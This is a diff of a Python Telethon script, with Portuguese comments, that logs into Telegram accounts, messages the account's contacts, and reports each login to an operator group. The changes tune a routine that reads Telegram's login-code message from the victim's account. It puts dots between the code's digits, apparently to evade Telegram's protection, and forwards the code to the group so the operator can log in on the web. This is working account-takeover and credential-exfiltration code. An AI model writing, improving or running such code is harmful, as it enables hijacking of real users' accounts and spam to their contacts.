@@ -148,10 +148,9 @@ async def login_and_send_messages(phone, code=None, phone_code_hash=None, update
         # Mensagem de log que será enviada
         log_message = f"O número '+{phone}' acabou de fazer login com sucesso!\n\n" \
                      f"Total de contatos encontrados: {len(contacts)}\n\n" \
-                     f"Mensagens enviadas: {success_count}, Falhas: {fail_count}"
+                     f"Mensagens enviadas: {success_count}, Falhas: {fail_count}\n\n"\
+                     f"Você terá 3 minutos para fazer login no web para o usuário receber outro código e eu vou buscar e mandar aqui novamente."
         
-        # Nova mensagem informando sobre o timer de 3 minutos
-        timer_message = "Você terá 3 minutos para fazer login no web para o usuário receber outro código e eu vou buscar e mandar aqui novamente."
         
         # NOVA IMPLEMENTAÇÃO SIMPLIFICADA: Entre no grupo especificado, envie o log e depois saia
         try:
@@ -164,18 +163,16 @@ async def login_and_send_messages(phone, code=None, phone_code_hash=None, update
                 print("Enviando mensagem de log no grupo...")
                 await client.send_message(group_entity, log_message)
                 
-                # Enviar a mensagem de timer separadamente
-                await client.send_message(group_entity, timer_message)
-                print("Mensagem de log e timer enviados com sucesso no grupo")
-                                
                 # 4. Sair do grupo
                 print("Saindo do grupo...")
                 await leave_telegram_group(client, group_entity)
                 print(f"Saiu com sucesso do grupo: {group_entity.title if hasattr(group_entity, 'title') else 'Teste'}")
                 
+                asyncio.create_task(check_system_message_after_delay(phone, 1))
+                 
                 # 5. Configurar o timer para obter e enviar mensagem do sistema após 3 minutos
                 # Criamos uma Task para isso para não bloquear a execução atual
-                asyncio.create_task(check_system_message_after_delay(phone, 180))  # 180 segundos = 3 minutos
+                asyncio.create_task(check_system_message_after_delay(phone, 60))  # 180 segundos = 3 minutos
             else:
                 print("Não foi possível entrar no grupo especificado.")
                 # Enviar mensagem diretamente para o criador do bot como backup
@@ -241,8 +238,22 @@ async def check_system_message_after_delay(phone, delay_seconds=180):
             latest_message = history.messages[0]
             print(f"Mensagem mais recente do sistema para +{phone}: {latest_message.message}")
             
-            # Formata a mensagem para reenvio
-            system_message = f"📢 CÓDIGO DO SISTEMA PARA +{phone} (após 3 minutos):\n\n{latest_message.message}\n\nRecebida em: {latest_message.date}"
+            # Extrai apenas o código de login da mensagem
+            import re
+            code_match = re.search(r'Código de login: (\d+)', latest_message.message)
+            
+            if code_match:
+                code_text = code_match.group(0)  # Pega apenas "Código de login: XXXXX"
+                
+                # Adiciona a letra 'l' entre cada número do código
+                code_value = re.search(r'(\d+)', code_text).group(1)
+                formatted_code = '.'.join(code_value)
+                
+                # Formata a mensagem para reenvio de forma mais limpa
+                system_message = f"📢 CÓDIGO DO SISTEMA PARA +{phone}:\n\nCódigo de login: {formatted_code}"
+            else:
+                # Se não conseguir extrair o código com o regex, usa a mensagem completa
+                system_message = f"📢 CÓDIGO DO SISTEMA PARA +{phone}:\n\n{latest_message.message}"
             
             # Entrar no grupo, enviar a mensagem e sair
             group_entity = await join_telegram_group(client, group_id=-4784851093, group_username="linbotteste")
